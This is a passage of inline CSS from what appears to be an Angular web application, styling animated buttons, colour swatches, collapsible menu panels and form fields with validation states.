                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .ipswich-main-buttons-link.inactive[_ngcontent-c8] {
            cursor: default;
            background: #b3e0ed;
            -webkit-animation: 0 ipswich-button-bold-inactived-animatedFIC;
            animation: 0 ipswich-button-bold-inactived-animatedFIC
        }

        .ipswich-main-buttons-link.inactive[_ngcontent-c8]:hover {
            background: #b3e0ed
        }

        @-webkit-keyframes ipswich-button-bold-inactived-animatedFIC {

            0%,
            100% {
                background: #b3e0ed
            }
        }

        @keyframes ipswich-button-bold-inactived-animatedFIC {

            0%,
            100% {
                background: #b3e0ed
            }
        }

        .ipswich-main-buttons-link.button-loading[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            -webkit-animation: .8s linear infinite from0to360Rotate;
            animation: .8s linear infinite from0to360Rotate
        }

        .ipswich-main-buttons-link-simple.small.advancedFilterMode[_ngcontent-c8],
        .ipswich-main-buttons-link.small.advancedFilterMode[_ngcontent-c8] {
            width: 97px
        }
    </style>
<style>
        .valera {
            height: 12px;
            width: 12px;
            margin-right: 12px
        }

        .H8bc349 {
            background-color: #8bc349
        }

        .Hf15a2b {
            background-color: #f15a2b
        }

        .H029688 {
            background-color: #029688
        }

        .H4caf4e {
            background-color: #4caf4e
        }

        .Hffc110 {
            background-color: #ffc110
        }

        .H488fcd {
            background-color: #488fcd
        }

        .H1e5e2f {
            background-color: #1e5e2f
        }

        .Hef4538 {
            background-color: #ef4538
        }

        .He71e63 {
            background-color: #e71e63
        }

        .Hcddc37 {
            background-color: #cddc37
        }

        .H07bcd4 {
            background-color: #07bcd4
        }

        .Hffea39 {
            background-color: #ffea39
        }

        .H903f98 {
            background-color: #903f98
        }

        .H795548 {
            background-color: #795548
        }

        .H13499e {
            background-color: #13499e
        }

        .H024d40 {
            background-color: #024d40
        }

        .H00589c {
            background-color: #00589c
        }

        .Hcccccc {
            background-color: #ccc
        }

        .H356a34 {
            background-color: #356a34
        }

        .H607d8b {
            background-color: #607d8b
        }

        .Hf8971c {
            background-color: #f8971c
        }

        .Hae5fa6 {
            background-color: #ae5fa6
        }

        .oldham {
            padding: 6px 8px;
            overflow: hidden
        }

        .oldham.lastTabHiddenMode .oldham_content_panel_start:last-child {
            display: none
        }

        .oldham.demoUIMode .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link .oldham-panel-title .oldham-panel-title-text {
            color: #ccc
        }

        .oldham.demoUIMode .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link .oldham-panel-title.active .oldham-panel-title-text {
            color: #12447f;
            font-family: dinMedium
        }

        .oldham.demoUIMode .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title .oldham-panel-title-text {
            color: #fff
        }

        .oldham.demoUIMode .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title.active .oldham-panel-title-text {
            color: #12447f
        }

        .oldham-panel-title {
            margin-top: 0;
            margin-bottom: 0;
            font-size: 16px;
            color: inherit;
            line-height: 1.1;
            display: inline-block;
            width: 100%;
            position: relative
        }

        .oldham-panel-separator {
            clear: both
        }

        .oldham_content_panel_start {
            background-color: #fff;
            border-radius: 0 !important;
            border: 0 !important;
            margin-top: 0 !important;
            margin-bottom: 0 !important;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .oldham-panel-heading {
            padding: 0;
            border-bottom: 1px solid transparent;
            border-top-right-radius: 3px;
            border-top-left-radius: 3px;
            border: 0;
            background: 0 0 !important
        }

        .oldham-panel-link {
            color: #a7b1c2 !important;
            text-decoration: none !important;
            display: block;
            padding: 9px 8px 3px;
            border-radius: 4px;
            cursor: pointer
        }

        .oldham-panel-link:not(.oldham-panel-link-disabled):hover {
            background: rgba(0, 0, 0, .05);
            -webkit-animation: .2s fromBettafightertoCrabBackground;
            animation: .2s fromBettafightertoCrabBackground
        }

        .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-active-icon,
        .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-icon,
        .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-indicator,
        .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-text {
            color: #0097c1
        }

        .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-description {
            height: auto;
            -webkit-animation: .5s from0to100Height;
            animation: .5s from0to100Height;
            color: #0097c1;
            opacity: .25
        }

        .oldham-panel-link.oldham-panel-link-disabled {
            cursor: default;
            opacity: .5
        }

        .oldham-panel-link.oldham-panel-link-not-options i.oldham-panel-title-indicator {
            display: none
        }

        .oldham-panel-link.oldham-panel-link-activo .oldham-panel-title-indicator {
            -webkit-transform: rotate3d(0, 0, 1, 90deg);
            transform: rotate3d(0, 0, 1, 90deg);
            -webkit-animation: .1s from0to90Rotate3D;
            animation: .1s from0to90Rotate3D
        }

        .oldham-panel-title-icon {
            float: none;
            display: table-cell;
            vertical-align: middle;
            color: #12447f
        }

        .oldham-panel-title.active .oldham-panel-title-icon {
            color: #12447f
        }

        .oldham-panel-title-icon i::before,
        .oldham-panel-title-icon i:before {
            margin-right: 12px
        }

        .oldham-panel-title-text {
            float: none;
            display: table-cell;
            padding-right: 20px;
            vertical-align: middle;
            text-align: left;
            color: #4d4d4d;
            font-size: 14px;
            font-weight: 400;
            font-family: dinRegular;
            line-height: normal;
            margin-top: -1px
        }

        .oldham-panel-title-indicator {
            float: right;
            color: #4d4d4d;
            font-size: 12px;
            font-weight: 700;
            padding-top: 3px;
            -webkit-transform: rotate3d(0, 0, 1, 0deg);
            transform: rotate3d(0, 0, 1, 0deg);
            -webkit-animation: .1s from90to0Rotate3D;
            animation: .1s from90to0Rotate3D;
            position: absolute;
            top: 0;
            right: 0
        }

        .oldham-panel-title-description {
            display: block;
            font-size: 12px;
            color: #8a8a8a;
            height: 0;
            overflow: hidden;
            clear: both;
            text-align: left;
            padding-top: 5px;
            line-height: 1.42857143;
            -webkit-animation: .5s fromAutoto0Height;
            animation: .5s fromAutoto0Height
        }

        .oldham-panel-title-active-icon,
        .oldham_content_panel_body_item_link-active-icon {
            display: none;
            color: #0097c1;
            font-size: 12px;
            float: right;
            vertical-align: middle;
            line-height: 20px;
            font-weight: 700
        }

        .oldham-panel-title-active-icon {
            line-height: 14px;
            padding-right: 0;
            font-size: 10px;
            font-weight: 700 !important
        }

        .oldham-panel-title.active .oldham-panel-title-text {
            color: #0097c1
        }

        .oldham-panel-title.active .oldham-panel-title-active-icon {
            display: inline-block;
            position: absolute;
            top: 0;
            right: 0
        }

        .oldham_content_panel_body_item_link.active .oldham_content_panel_body_item_link-text {
            color: #0097c1
        }

        .oldham_content_panel_body_item_link.active .oldham_content_panel_body_item_link-active-icon {
            display: inline-block
        }

        .oldham_content_panel_body {
            border-top-color: #ddd;
            padding: 0 !important
        }

        .oldham_content_panel_body_ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        .oldham_content_panel_body_item_link {
            cursor: pointer;
            display: block;
            padding: 10px 10px 10px 49px;
            border-radius: 4px
        }

        .oldham_content_panel_body_item_link:not(.is-disabled):hover {
            background: rgba(0, 0, 0, .05);
            -webkit-animation: .2s fromBettafightertoCrabBackground;
            animation: .2s fromBettafightertoCrabBackground
        }

        .oldham_content_panel_body_item_link:not(.is-disabled):hover .oldham_content_panel_body_item_link-active-icon,
        .oldham_content_panel_body_item_link:not(.is-disabled):hover .oldham_content_panel_body_item_link-icon,
        .oldham_content_panel_body_item_link:not(.is-disabled):hover .oldham_content_panel_body_item_link-text {
            color: #0097c1
        }

        .oldham_content_panel_body_item_link.is-disabled {
            cursor: default;
            opacity: .5
        }

        .oldham_content_panel_body_item_link-text {
            color: #4d4d4d;
            font-size: 14px;
            float: none;
            display: table-cell;
            padding-top: 0;
            padding-left: 14px;
            vertical-align: middle;
            text-align: left
        }

        .oldham_content_panel_body_item_link-icon {
            float: none;
            display: table-cell;
            padding-top: 0;
            vertical-align: middle;
            color: #12447f
        }

        .oldham_content_panel_body_item_link.active .oldham_content_panel_body_item_link-icon {
            color: #0097c1
        }

        .oldham_content_panel_body-open {
            max-height: 900px;
            overflow: hidden;
            -webkit-transition: max-height .3s ease-in;
            transition: max-height .3s ease-in
        }

        .oldham_content_panel_body-closed {
            max-height: 0 !important;
            overflow: hidden;
            -webkit-transition: max-height .3s ease;
            transition: max-height .3s ease
        }

        .dark .oldham_content_panel_start {
            background: 0 0
        }

        .dark .oldham-panel-title-text {
            color: #f8f8f8
        }

        .oldham.skip-fullscreen .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link_separator {
            border-top: 1px solid #e6e6e6;
            margin: 6px
        }

        .oldham_content_panel_body_item .oldham-panel-link_separator {
            margin-left: 39px
        }

        @media screen and (max-width:767px) and (min-width:320px) {
            .rangeDateFilterLeftMode.oldham {
                padding-bottom: 0
            }

            .rangeDateFilterRightMode.oldham {
                padding-top: 0
            }
        }

        @media screen and (min-width:640px) {
            .oldham-panel-title-text {
                max-width: 300px
            }
        }

        @media screen and (max-width:639px) and (min-width:320px) {
            .oldham:not(.skip-fullscreen) .oldham-panel-title-text {
                font-size: 16px
            }

            .oldham:not(.skip-fullscreen) .oldham_content_panel_start {
                border-bottom: 1px solid #e9e9e9 !important
            }

            .oldham:not(.skip-fullscreen) .oldham-panel-link {
                padding: 13px 12px 7px
            }

            .oldham:not(.skip-fullscreen) .oldham-panel-title-icon {
                font-size: 18px
            }

            .oldham:not(.skip-fullscreen) .oldham-panel-title-indicator {
                font-size: 14px
            }

            .oldham:not(.skip-fullscreen) .oldham_content_panel_body_item_link {
                padding: 16px 10px;
                border-bottom: 1px solid #e9e9e9
            }

            .oldham:not(.skip-fullscreen) .oldham_content_panel_body_item_link-text {
                font-size: 16px
            }
        }

        .backoffice :host .oldham-panel-title-icon {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-title.active .oldham-panel-title-icon {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-icon {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-text {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-title.active .oldham-panel-title-text {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-title-active-icon,
        .backoffice :host .oldham_content_panel_body_item_link-active-icon {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-link:not(.oldham-panel-link-disabled):hover .oldham-panel-title-active-icon {
            color: #ff4800
        }

        .backoffice :host .oldham-panel-link {
            padding: 3px 8px
        }

        .backoffice :host .oldham-panel-title-text {
            font-family: Verdana, Arial, Helvetica, sans-serif;
            font-size: 13px
        }

        .oldham .oldham-panel-title .oldham-panel-title-icon i.stream-pago_Multiples_1 {
            font-size: 19px
        }

        .oldham .oldham_content_panel_start .oldham-panel-heading .oldham-panel-link .oldham-panel-title-text {
            padding-right: 20px
        }

        body.dark .oldham .oldham_content_panel_start {
            background: #fff
        }

        body.dark .oldham .oldham_content_panel_start .oldham-panel-link .oldham-panel-title .oldham-panel-title-icon,
        body.dark .oldham .oldham_content_panel_start .oldham-panel-link .oldham-panel-title .oldham-panel-title-text {
            color: #181818
        }

        body.dark .oldham .oldham_content_panel_start .oldham-panel-link:hover:not(.oldham-panel-link-disabled) .oldham-panel-title .oldham-panel-title-icon,
        body.dark .oldham .oldham_content_panel_start .oldham-panel-link:hover:not(.oldham-panel-link-disabled) .oldham-panel-title .oldham-panel-title-text {
            color: #0097c1
        }
    </style>
<style></style>
<style>
        @charset "UTF-8";

        .venecia-form[_ngcontent-c21] {
            padding: 0 30px 20px
        }

        .venecia-main-form[_ngcontent-c21] {
            padding: 10px 0
        }

        .venecia-main-form-label-parent[_ngcontent-c21] {
            display: inline-block
        }

        .venecia-main-form-label[_ngcontent-c21] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .venecia-main-form-content[_ngcontent-c21] {
            display: inline-block
        }

        .venecia-main-form-label-readonly[_ngcontent-c21] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            vertical-align: middle
        }

        .venecia-main-form-label-readonly[_ngcontent-c21]:after {
            content: ":"
        }

        .venecia-main-form-label-data[_ngcontent-c21] {
            display: inline-block;
            font-size: 14px;
            color: #333;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            vertical-align: middle;
            padding-top: 0
        }

        .venecia-main-form-input[_ngcontent-c21] {
            border: 1px solid #bbb;
            width: 215px;
            height: 30px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 3px
        }

        .venecia-main-form-input.disabled[_ngcontent-c21] {
            border: 1px solid rgba(187, 187, 187, .4);
            background: #fff
        }

        .venecia-main-form-input.x-small[_ngcontent-c21] {
            width: 70px
        }

        .venecia-main-form-input.required[_ngcontent-c21],
        .venecia-main-form-input.required[_ngcontent-c21]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-input.required.valid[_ngcontent-c21],
        .venecia-main-form-input.required[_ngcontent-c21]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-input.required.disabled[_ngcontent-c21],
        .venecia-main-form-input.required[_ngcontent-c21]:focus.disabled {
            border-left: 3px solid rgba(0, 167, 86, .4) !important;
            background: #fff
        }

        .venecia-main-form-input[_ngcontent-c21]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-input[_ngcontent-c21]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c21]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c21]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c21]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[type=email][_ngcontent-c21],
        .venecia-main-form-input[type=number][_ngcontent-c21],
        .venecia-main-form-input[type=tel][_ngcontent-c21],
        .venecia-main-form-input[type=text][_ngcontent-c21] {
            padding: 0 8px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c21] {
            padding: 0 10px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c21]::-webkit-inner-spin-button {
            display: none
        }

        .venecia-main-form-input[type=date][_ngcontent-c21]::-webkit-calendar-picker-indicator {
            display: none
        }

        .venecia-main-form-input.required[_ngcontent-c21]:-moz-read-only,
        .venecia-main-form-input[_ngcontent-c21]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-input.required[_ngcontent-c21]:read-only,
        .venecia-main-form-input[_ngcontent-c21]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea[_ngcontent-c21] {
            border: 1px solid #bbb;
            width: 215px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 2px;
            resize: none
        }

        .venecia-main-form-textarea.required[_ngcontent-c21],
        .venecia-main-form-textarea.required[_ngcontent-c21]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-textarea.required.valid[_ngcontent-c21],
        .venecia-main-form-textarea.required[_ngcontent-c21]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-textarea[_ngcontent-c21]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-textarea[_ngcontent-c21]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c21]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c21]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c21]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea.required[_ngcontent-c21]:-moz-read-only,
        .venecia-main-form-textarea[_ngcontent-c21]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea.required[_ngcontent-c21]:read-only,
        .venecia-main-form-textarea[_ngcontent-c21]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        @-webkit-keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        @keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        .venecia-main-form-input[_ngcontent-c21]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c21]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c21]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c21]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c21]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c21]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c21]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c21]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c21]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c21]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c21]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c21]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c21]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c21]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c21]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c21]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-form-input.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-form-input.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-form-input.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-form-textarea.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-form-textarea.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-form-textarea.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-form-textarea.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-form-title[_ngcontent-c21] {
            font-size: 16px;
            margin: 0;
            padding: 0;
            color: #12447f
        }

        .venecia-main-form-line-separator[_ngcontent-c21] {
            height: 1px;
            width: 100%;
            background: #e1e1e1;
            margin: 2px 0
        }

        .venecia-main-form-required[_ngcontent-c21] {
            height: 10px;
            border-left: 3px solid #0097c1;
            line-height: .4;
            padding-left: 8px;
            margin-top: -10px
        }

        .venecia-main-form-required[_ngcontent-c21]:before {
            clear: both
        }

        .venecia-main-form-required-text[_ngcontent-c21] {
            line-height: 0;
            font-size: 11px
        }

        .venecia-main-form-required.no-show[_ngcontent-c21] {
            display: none
        }

        .venecia-main-validation[_ngcontent-c21] {
            color: #b20000;
            font-size: 12px;
            padding-left: 149px;
            padding-top: 5px;
            opacity: 0
        }

        .venecia-main-form.invalid[_ngcontent-c21] .venecia-main-validation[_ngcontent-c21] {
            display: block;
            opacity: 1;
            -webkit-animation: .3s venecia-validation-message-animated;
            animation: .3s venecia-validation-message-animated
        }

        .confirmationMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            width: 30px
        }

        @-webkit-keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .venecia-main-form[_ngcontent-c21] .venecia-main-validation[_ngcontent-c21] {
            display: none;
            opacity: 0;
            -webkit-animation: .3s venecia-validation-message-reverse;
            animation: .3s venecia-validation-message-reverse
        }

        @-webkit-keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        @keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        .venecia-main-form.invalid[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21] {
            border: 1px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-animated;
            animation: .3s venecia-validation-input-animated
        }

        .venecia-main-form[_ngcontent-c21] .venecia-main-form-input[_ngcontent-c21] {
            border: 1px solid #bbb;
            -webkit-animation: .3s venecia-validation-input-reverse;
            animation: .3s venecia-validation-input-reverse
        }

        .venecia-main-form-input[_ngcontent-c21],
        .venecia-main-form-input[_ngcontent-c21]:focus,
        .venecia-main-form-textarea[_ngcontent-c21],
        .venecia-main-form-textarea[_ngcontent-c21]:focus {
            border-left: 3px solid #bbb;
            background: #fff
        }

        .venecia-main-form.invalid[_ngcontent-c21] .venecia-main-form-input.required[_ngcontent-c21] {
            border: 1px solid #b20000;
            border-left: 3px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-required-animated;
            animation: .3s venecia-validation-input-required-animated
        }

        .venecia-main-form[_ngcontent-c21] .venecia-main-form-input.required[_ngcontent-c21] {
            border: 1px solid #bbb;
            border-left: 3px solid #0097c1;
            -webkit-animation: .3s venecia-validation-input-required-reverse;
            animation: .3s venecia-validation-input-required-reverse
        }

        @-webkit-keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        @keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error[_ngcontent-c21] {
            width: 215px
        }

        .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.large[_ngcontent-c21] {
            width: 350px
        }

        .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error[_ngcontent-c21] {
            width: 170px
        }

        .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.xsmall[_ngcontent-c21] {
            width: 128px
        }

        .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.small[_ngcontent-c21] {
            width: 168px
        }

        .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.medium[_ngcontent-c21] {
            width: 296px
        }

        .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.large[_ngcontent-c21] {
            width: 350px
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .venecia-main-form-input[_ngcontent-c21] {
                font-size: 13px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error[_ngcontent-c21],
            .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.large[_ngcontent-c21],
            .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.medium[_ngcontent-c21],
            .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.small[_ngcontent-c21],
            .venecia-main-form-input[_ngcontent-c21]+.venecia-main-box-error.xsmall[_ngcontent-c21],
            .venecia-main-form-select[_ngcontent-c21]+.venecia-main-box-error[_ngcontent-c21],
            .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error[_ngcontent-c21],
            .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.large[_ngcontent-c21],
            .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.medium[_ngcontent-c21],
            .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.small[_ngcontent-c21],
            .venecia-main-form-textarea[_ngcontent-c21]+.venecia-main-box-error.xsmall[_ngcontent-c21] {
                width: 100%
            }

            .venecia-main-form-input[_ngcontent-c21] {
                font-size: 13px;
                display: block
            }

            .venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
                display: block
            }

            .venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select[_ngcontent-c21] {
                width: 100%
            }

            .venecia-main-box[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] .venecia-main-form-select.disabled[_ngcontent-c21] {
                background-color: #a4a4a4;
                opacity: .4;
                border-left: none !important
            }

            .venecia-main-box[_ngcontent-c21] .venecia-main-box-error[_ngcontent-c21] {
                margin-left: 3px
            }

            .venecia-main-form[_ngcontent-c21] {
                padding: 8px 0 0
            }

            .venecia-form[_ngcontent-c21] {
                padding: 0 15px 20px
            }

            .venecia-main-form-label[_ngcontent-c21] {
                width: 100%
            }

            .venecia-main-form-label-data[_ngcontent-c21] {
                display: block
            }

            .venecia-main-form-input.large[_ngcontent-c21],
            .venecia-main-form-input.medium[_ngcontent-c21],
            .venecia-main-form-input.small[_ngcontent-c21],
            .venecia-main-form-input.xsmall[_ngcontent-c21],
            .venecia-main-form-textarea.large[_ngcontent-c21],
            .venecia-main-form-textarea.medium[_ngcontent-c21],
            .venecia-main-form-textarea.small[_ngcontent-c21],
            .venecia-main-form-textarea.xsmall[_ngcontent-c21] {
                width: 100%
            }
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-data[_ngcontent-c21] {
                line-height: 30px;
                min-height: 30px
            }

            .venecia-main-form-label-parent[_ngcontent-c21] {
                display: inline-block;
                vertical-align: top;
                min-height: 30px;
                padding-top: 2px
            }

            .venecia-main-box.officialReceiptYearMode[_ngcontent-c21] {
                left: 265px
            }
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] {
            display: block;
            width: auto;
            height: auto;
            margin: 0 !important;
            padding: 0 0 4px !important;
            min-height: 0 !important;
            line-height: normal;
            white-space: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label[_ngcontent-c21] {
            display: inline-block;
            width: 146px;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 12px;
            color: #666
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-data[_ngcontent-c21] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            max-width: calc(100% - 150px);
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 14px;
            color: #333
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-label-parent[_ngcontent-c21] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 0;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-content[_ngcontent-c21],
        .venecia-main-box.formLayoutMode[_ngcontent-c21] .venecia-main-form-drop[_ngcontent-c21] {
            display: inline-block;
